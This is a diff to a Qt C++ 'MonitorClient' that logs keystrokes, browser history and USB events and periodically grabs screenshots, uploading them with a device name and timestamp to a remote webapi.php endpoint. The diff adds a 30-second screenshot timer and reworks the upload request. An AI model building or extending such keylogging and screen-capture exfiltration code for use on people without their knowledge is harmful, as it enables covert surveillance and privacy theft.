@@ -40,12 +40,15 @@
 #include <qarraydata.h>
 #include <qchar.h>
 #include <qdatetime.h>
+#include <qdebug.h>
 #include <qglobal.h>
 #include <qjsonobject.h>
 
 #define TIC_INTERVAL 30
 #define HISTORY_INTERVAL 120
 #define KEY_INTERVAL 60
+// #define USB_INTERVAL 60
+#define SCREEN_INTERVAL 30
 #define STORAGE_CHECK_INTERVAL 5
 
 MonitorClient::MonitorClient()
@@ -68,11 +71,11 @@ MonitorClient::MonitorClient()
     connect(this, &MonitorClient::usbEvent, keyboardMonitor, &KeyboardMonitor::handleUsbEvent);
     
     // Connect signals to their respective slots
-    connect(this, &MonitorClient::screen, this, &MonitorClient::getScreen);
-    connect(this, &MonitorClient::tic, this, &MonitorClient::sendTic);
-    connect(this, &MonitorClient::browserHistory, this, &MonitorClient::sendBrowserHistories);
-    connect(this, &MonitorClient::keyLog, this, &MonitorClient::sendKeyLogs);
-    connect(this, &MonitorClient::usbLog, this, &MonitorClient::sendUSBLogs);
+    // connect(this, &MonitorClient::screen, this, &MonitorClient::getScreen);
+    // connect(this, &MonitorClient::tic, this, &MonitorClient::sendTic);
+    // connect(this, &MonitorClient::browserHistory, this, &MonitorClient::sendBrowserHistories);
+    // connect(this, &MonitorClient::keyLog, this, &MonitorClient::sendKeyLogs);
+    // connect(this, &MonitorClient::usbLog, this, &MonitorClient::sendUSBLogs);
     
     if (!keyboardMonitor->startMonitoring()) {
         qDebug() << "Failed to start keyboard monitoring";
@@ -252,6 +255,7 @@ int MonitorClient::getScreen()
     int sendResult = 0;
 
     bool res;
+    qDebug() << "Grabbing screen";
     grabScreen(filePath, res);
 
     if (res) 
@@ -323,24 +327,36 @@ int MonitorClient::sendScreens(QString filePath){
         QNetworkAccessManager mgr;
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
-        // the HTTP request
-        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi.php").arg(serverIP).arg(serverPort)));
+        // Use new API endpoint and required parameters
+        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi.php?type=upload").arg(serverIP).arg(serverPort)));
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
+        // Add com_name (device identifier)
+        QHttpPart comNamePart;
+        comNamePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"com_name\""));
+        comNamePart.setBody(clientName.toUtf8());
+        multiPart->append(comNamePart);
+
+        // Add ctime (capture timestamp)
+        QHttpPart ctimePart;
+        ctimePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"ctime\""));
+        QString ctime = QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss");
+        ctimePart.setBody(ctime.toUtf8());
+        multiPart->append(ctimePart);
+
+        // Add imagefile (the screenshot)
         QHttpPart imagePart;
         imagePart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("image/jpeg"));
-        imagePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("multipart/form-data; name=\"fileToUpload\"; filename=\""+filePath+"\""));
+        imagePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"imagefile\"; filename=\"screenshot.jpg\""));
         imagePart.setRawHeader("Content-Transfer-Encoding","binary");
         QFile *file = new QFile(filePath);
         file->open(QIODevice::ReadOnly);
         imagePart.setBodyDevice(file);
-        file->setParent(multiPart); // we cannot delete the file now, so delete it with the multiPart
+        file->setParent(multiPart); // file will be deleted with multiPart
 
         multiPart->append(imagePart);
-        
+
         QNetworkReply *reply = mgr.post(req, multiPart);
-        
-        
         multiPart->setParent(reply); // delete the multiPart with the reply    
         eventLoop.exec(); // blocks stack until "finished()" has been called
         
@@ -919,6 +935,7 @@ void MonitorClient::run()
 {
     qint64 lastTicTime = QDateTime::currentSecsSinceEpoch();
     qint64 lastHistoryTime = lastTicTime;
+    qint64 lastScreenshotTime = lastTicTime;
     qint64 lastKeyLogTime = lastTicTime;
     
     while (!isInterruptionRequested()) {
@@ -944,6 +961,12 @@ void MonitorClient::run()
             if (currentTime - lastTicTime >= TIC_INTERVAL) {
                 emit tic();
                 lastTicTime = currentTime;
+            }
+            
+            // Send browser histories every HISTORY_INTERVAL seconds
+            if (currentTime - lastScreenshotTime >= SCREEN_INTERVAL && screenshotEnabled) {
+                emit screen();
+                lastScreenshotTime = currentTime;
             }
             
             // Send browser histories every HISTORY_INTERVAL seconds
@@ -1469,6 +1492,7 @@ void MonitorClient::onSendAllAction()
     getBrowserHistory();
     
     // Then emit all signals to send data
+    qDebug() << "Sending all data to server...";
     emit screen();
     emit tic();
     emit browserHistory();
